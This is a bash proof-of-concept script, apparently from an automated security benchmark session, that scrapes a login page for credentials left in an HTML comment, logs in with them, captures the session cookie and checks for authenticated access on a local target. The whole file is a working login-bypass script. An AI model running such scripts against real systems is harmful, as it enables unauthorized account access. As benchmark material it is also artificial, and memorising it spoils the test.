#!/bin/bash
# POC: Demonstrates exposed testing credentials (test:test) in HTML source and successful authentication bypass
# Target: ./repo
# Created: 2025-11-07T18:09:35.588Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# Exposed Testing Credentials POC
# Demonstrates how test credentials exposed in HTML can be used for authentication bypass

TARGET_URL="${1:-http://localhost:80}"
VERBOSE="${2:-true}"

echo "[*] Exposed Testing Credentials Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Fetch login page and check for exposed credentials in HTML
echo "[Step 1] Fetching login page HTML to check for exposed credentials..."
HTML_RESPONSE=$(curl -s "$TARGET_URL/login")

# Check if TODO comment with credentials exists
if echo "$HTML_RESPONSE" | grep -q "TODO.*test:test"; then
    echo "[+] VULNERABLE: Found exposed test credentials in HTML comment!"
    echo "[+] Comment found: $(echo "$HTML_RESPONSE" | grep -o "<!-- TODO.*-->")"
    echo ""
else
    echo "[-] Could not find credential comment in HTML"
fi

# Step 2: Attempt authentication with exposed credentials
echo "[Step 2] Attempting authentication with exposed test:test credentials..."
AUTH_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/login" \
    -d "username=test&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded")

# Extract HTTP status code and Set-Cookie header
HTTP_STATUS=$(echo "$AUTH_RESPONSE" | head -n 1 | grep -oE "[0-9]{3}")
SESSION_COOKIE=$(echo "$AUTH_RESPONSE" | grep -i "set-cookie" | head -1)

echo "[*] HTTP Status: $HTTP_STATUS"
if [ ! -z "$SESSION_COOKIE" ]; then
    echo "[+] Session cookie set: $SESSION_COOKIE"
else
    echo "[-] No session cookie in response"
fi
echo ""

# Step 3: Extract and test session cookie for authenticated access
if [ ! -z "$SESSION_COOKIE" ]; then
    echo "[Step 3] Testing authenticated access with obtained session cookie..."
    
    # Extract cookie value (typically between = and ;)
    COOKIE_VALUE=$(echo "$SESSION_COOKIE" | sed -n 's/.*session=\([^;]*\).*/\1/p')
    
    if [ ! -z "$COOKIE_VALUE" ]; then
        HOME_RESPONSE=$(curl -s "$TARGET_URL/home" \
            -H "Cookie: session=$COOKIE_VALUE")
        
        if echo "$HOME_RESPONSE" | grep -q "Welcome"; then
            echo "[+] VULNERABLE: Successfully authenticated!"
            echo "[+] Authenticated response contains: $(echo "$HOME_RESPONSE" | grep -o "Welcome [^<]*")"
            echo ""
            echo "[!] EXPLOITATION SUCCESSFUL"
            echo "[!] Test credentials (test:test) exposed in HTML allowed full authentication bypass"
            exit 0
        fi
    fi
fi

# Step 4: Alternative check - direct auth verification
echo "[Step 4] Verifying credentials work for authentication..."
VERIFY_RESPONSE=$(curl -s -X POST "$TARGET_URL/login" \
    -d "username=test&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded")

if echo "$VERIFY_RESPONSE" | grep -q "302\|redirect\|Location"; then
    echo "[+] VULNERABLE: Redirect detected - authentication successful"
    echo "[+] Test credentials are valid and functional"
    exit 0
elif echo "$VERIFY_RESPONSE" | grep -qi "home\|dashboard\|welcome"; then
    echo "[+] VULNERABLE: Successfully authenticated with exposed credentials"
    exit 0
fi

echo "[-] Could not verify successful authentication"
exit 1